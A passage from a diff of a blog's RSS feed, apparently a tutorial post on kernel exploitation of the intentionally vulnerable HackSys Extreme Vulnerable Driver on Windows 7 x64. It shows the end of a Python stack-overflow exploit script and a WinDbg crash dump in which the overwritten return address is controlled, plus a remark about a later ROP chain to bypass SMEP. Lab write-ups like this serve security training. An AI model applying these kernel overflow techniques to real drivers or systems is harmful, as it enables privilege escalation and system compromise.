+                                           &lt;span class=&quot;n&quot;&gt;nInBufferSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                                           &lt;span class=&quot;n&quot;&gt;lpOutBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                                           &lt;span class=&quot;n&quot;&gt;nOutBufferSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                                           &lt;span class=&quot;n&quot;&gt;lpBytesReturned&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                                           &lt;span class=&quot;n&quot;&gt;lpOverlapped&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[-]Error: Not pwnd :(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FormatError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;**HackSys Extreme Vulnerable Driver**&quot;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;**Stack buffer overflow exploit**&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;trigger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gethandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ctl_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x800&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;If you are smarter than I was when I first started this it might occur to you to save your exploit somewhere safe before triggering a BSOD so that you don’t lose everything. I only made that mistake once :(. After you’ve got it safely saved somewhere, let’s run this thing and hopefully our debugger should show that bad (good?) things happened…&lt;/p&gt;
+
+&lt;p&gt;FIRE IN THE HOLE!&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;****** HACKSYS_EVD_STACKOVERFLOW ******
+[+] UserBuffer: 0x0000000002D99330
+[+] UserBuffer Size: 0x819
+[+] KernelBuffer: 0xFFFFF88004EC6FE0
+[+] KernelBuffer Size: 0x800
+[+] Triggering Stack Overflow
+
+*** Fatal System Error: 0x0000003b
+                       (0x00000000C0000005,0xFFFFF88005921912,0xFFFFF88004EC6E00,0x0000000000000000)
+
+Break instruction exception - code 80000003 (first chance)
+
+A fatal system error has occurred.
+Debugger entered on first try; Bugcheck callbacks have not been invoked.
+
+Connected to Windows 7 7601 x64 target at (Wed Jul  6 14:33:45.047 2016 (UTC - 4:00)), ptr64 TRUE
+   
+Use !analyze -v to get detailed debugging information.
+
+BugCheck 3B, {c0000005, fffff88005921912, fffff88004ec6e00, 0}
+
+0: kd&amp;gt; !analyze -v
+*******************************************************************************
+*                                                                             *
+*                        Bugcheck Analysis                                    *
+*                                                                             *
+*******************************************************************************
+
+SYSTEM_SERVICE_EXCEPTION (3b)
+An exception happened while executing a system service routine.
+Arguments:
+Arg1: 00000000c0000005, Exception code that caused the bugcheck
+Arg2: fffff88005921912, Address of the instruction which caused the bugcheck
+Arg3: fffff88004ec6e00, Address of the context record for the exception that caused the bugcheck
+Arg4: 0000000000000000, zero.
+
+Debugging Details:
+------------------
+ 
+BUGCHECK_P1: c0000005
+
+BUGCHECK_P2: fffff88005921912
+
+BUGCHECK_P3: fffff88004ec6e00
+
+BUGCHECK_P4: 0
+
+EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.
+
+FAULTING_IP: 
+HEVD-Win7x64+6912
+fffff880`05921912 c3              ret
+
+CONTEXT:  fffff88004ec6e00 -- (.cxr 0xfffff88004ec6e00)
+rax=0000000000000000 rbx=4444444444444444 rcx=fffff88004ec6fe0
+rdx=0000077ffded2350 rsi=0000000000000000 rdi=fffffa8003e10760
+rip=fffff88005921912 rsp=fffff88004ec77e8 rbp=fffffa8002295c70
+ r8=0000000000000000  r9=0000000000000000 r10=0000000000000000
+r11=fffff88004ec77e0 r12=fffffa80042ada00 r13=0000000000000000
+r14=4242424242424242 r15=0000000000000003
+iopl=0         nv up ei pl zr na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
+HEVD-Win7x64+0x6912:
+fffff880`05921912 c3              ret
+Resetting default scope
+
+DEFAULT_BUCKET_ID:  WIN7_DRIVER_FAULT
+
+BUGCHECK_STR:  0x3B
+
+PROCESS_NAME:  pythonw.exe
+
+CURRENT_IRQL:  2
+
+LAST_CONTROL_TRANSFER:  from 4343434343434343 to fffff88005921912
+
+STACK_TEXT:  
+fffff880`04ec77e8 43434343`43434343 : 44444444`44444444 00000000`00000000 fffffa80`03e10760 fffff880`04ec7a01 : HEVD+0x6912
+fffff880`04ec77f0 44444444`44444444 : 00000000`00000000 fffffa80`03e10760 fffff880`04ec7a01 00000000`00000000 : 0x43434343`43434343
+fffff880`04ec77f8 00000000`00000000 : fffffa80`03e10760 fffff880`04ec7a01 00000000`00000000 fffff880`059211ea : 0x44444444`44444444
+
+FOLLOWUP_IP: 
+HEVD-Win7x64+6912
+fffff880`05921912 c3              ret
+
+FAULT_INSTR_CODE:  8348ccc3
+
+SYMBOL_STACK_INDEX:  0
+
+SYMBOL_NAME:  HEVD-Win7x64+6912
+
+FOLLOWUP_NAME:  MachineOwner
+
+MODULE_NAME: HEVD-Win7x64
+
+IMAGE_NAME:  HEVD-Win7x64.sys
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;As you can see from this abbreviated output, a bugcheck was triggered when a &lt;code class=&quot;highlighter-rouge&quot;&gt;ret&lt;/code&gt; instruction was called where the top of the stack contained the value 0x4343434343434343. Also of note, we own the rbx and r14 registers which will come in handy when we have to build out a ROP chain to bypass SMEP in Windows 8.1… More on that later. Stay tuned!&lt;/p&gt;
+</description>
+        <pubDate>Wed, 06 Jul 2016 00:00:00 -0400</pubDate>
+        <link>https://sizzop.github.io/2016/07/06/kernel-hacking-with-hevd-part-2.html</link>
+        <guid isPermaLink="true">https://sizzop.github.io/2016/07/06/kernel-hacking-with-hevd-part-2.html</guid>
+        
+        
+      </item>
     
       <item>
         <title>Kernel Hacking With HEVD Part 1 - The Setup</title>
